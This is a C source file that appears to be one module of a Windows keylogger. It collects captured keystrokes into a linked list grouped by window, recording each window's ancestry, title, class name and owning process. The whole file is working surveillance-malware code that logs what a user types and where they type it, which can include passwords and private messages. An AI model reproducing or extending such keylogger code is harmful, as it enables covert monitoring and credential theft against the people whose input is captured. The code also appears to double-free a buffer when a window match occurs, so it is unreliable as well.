//* Running in the Main Thread.

#include "..\..\..\Include\Keylog.h"

KLTEMPDATA *pStartNode;
extern KLPROCESSDATA TempProcessData;

extern CRITICAL_SECTION csLinkList;

BOOL BuildTempLinkList(HWND hWnd, WCHAR *KeyPressed) {
    BOOL fHandleMatch = FALSE;
    BOOL fEvent = FALSE;

    int Index = 0;
    int iRetVal = 0;
    DWORD ThreadRetVal = -1;
    BOOL FuncRetVal = FALSE;
    KLTEMPDATA *pKLTempData = NULL;

    if ((pKLTempData = (KLTEMPDATA*)malloc(sizeof(KLTEMPDATA))) == NULL)
        return FALSE;
    pKLTempData->pNextLink = NULL;

    __try {
        iRetVal = wcscpy_s(pKLTempData->Keys, MAX_KEY_NAME, KeyPressed);
        pKLTempData->KeysBufferLength = wcslen(pKLTempData->Keys);
        pKLTempData->KeyCount = 1;

        FuncRetVal = QueryHandleHierarchy(hWnd, pKLTempData);
        if (FuncRetVal == FALSE)
            return FALSE;

        EnterCriticalSection(&csLinkList);

        if (pStartNode == NULL) {
            FuncRetVal = AddNewNode(pKLTempData);
            if (FuncRetVal == FALSE)
                return FALSE;

            pStartNode = pKLTempData;

            return TRUE;
        }

        KLTEMPDATA *pCurNode = pStartNode;

        do {
            if ((pKLTempData->WndCount == pCurNode->WndCount) && (pCurNode->KeysBufferLength <= (MAX_KL_KEYS - pKLTempData->KeysBufferLength)))	// check WndCount == 1
            {
                Index = pKLTempData->WndCount;
                if (pKLTempData->KLWndData[Index - 1].hWnd == pCurNode->KLWndData[Index - 1].hWnd) {
                    fHandleMatch = TRUE;
                    // Append Keys
                    wcscat_s(pCurNode->Keys, MAX_KL_KEYS, pKLTempData->Keys);
                    pCurNode->KeysBufferLength = wcslen(pCurNode->Keys);
                    pCurNode->KeyCount++;

                    free(pKLTempData);	// Node not appended, keys are appended !
                    return TRUE;
                }
            }
            pCurNode = pCurNode->pNextLink;
        } while (pCurNode != NULL);

        if (fHandleMatch == FALSE) {
            FuncRetVal = AddNewNode(pKLTempData);
            if (FuncRetVal == FALSE)
                return FALSE;

            pCurNode = pStartNode;
            while (pCurNode->pNextLink != NULL)
                pCurNode = pCurNode->pNextLink;

            pCurNode->pNextLink = pKLTempData;
        }

        return TRUE;
    }
    __finally {
        LeaveCriticalSection(&csLinkList);

        if ((FuncRetVal == FALSE) && pKLTempData)
            free(pKLTempData);
    }
}

BOOL QueryHandleHierarchy(HWND hWnd, KLTEMPDATA *pKLTempData) {
    int Index = 0;

    HWND hParent = NULL;
    HWND hRoot = NULL;
    HWND hRootParent = NULL;

    hRoot = GetAncestor(hWnd, GA_ROOT);
    hRootParent = GetAncestor(hRoot, GA_PARENT);

    pKLTempData->KLWndData[Index].hWnd = hWnd;
    pKLTempData->WndCount = 1;

    hParent = GetAncestor(pKLTempData->KLWndData[Index].hWnd, GA_PARENT);
    Index++;

    while (hParent != hRootParent && pKLTempData->WndCount <= MAX_WND_LIST) {
        pKLTempData->KLWndData[Index].hWnd = hParent;
        pKLTempData->WndCount++;

        hParent = GetAncestor(pKLTempData->KLWndData[Index].hWnd, GA_PARENT);
        Index++;
    }
    return TRUE;
}

BOOL AddNewNode(KLTEMPDATA *pKLTempData) {
    BOOL FuncRetVal = FALSE;
    KLTEMPDATA *pCurNode = pStartNode;

    FuncRetVal = FillKLWindowData(pKLTempData);
    if (FuncRetVal == FALSE)
        return FALSE;

    memcpy(&pKLTempData->ProcessData, &TempProcessData, sizeof(KLPROCESSDATA));

    return TRUE;
}

BOOL FillKLWindowData(KLTEMPDATA *pKLTempData) {
    int Index = 0;
    int iRetVal = 0;

    for (Index = 0; Index <= pKLTempData->WndCount - 1; Index++) {
        iRetVal = GetWindowText(pKLTempData->KLWndData[Index].hWnd, pKLTempData->KLWndData[Index].wszWndTitle, MAX_WND_TITLE);
        if (iRetVal == 0) {
            iRetVal = GetLastError();
            if (iRetVal == 0)
                wcscpy_s(pKLTempData->KLWndData[Index].wszWndTitle, MAX_WND_TITLE, L"NO WINDOW TITLE");
            else
                return FALSE;
        }

        iRetVal = GetClassName(pKLTempData->KLWndData[Index].hWnd, pKLTempData->KLWndData[Index].wszClassName, MAX_CLASS_NAME);
        if (iRetVal == 0) {
            iRetVal = GetLastError();
            if (iRetVal == 0)
                wcscpy_s(pKLTempData->KLWndData[Index].wszClassName, MAX_CLASS_NAME, L"NO CLASS NAME");
            else
                return FALSE;
        }
    }

    return TRUE;
}
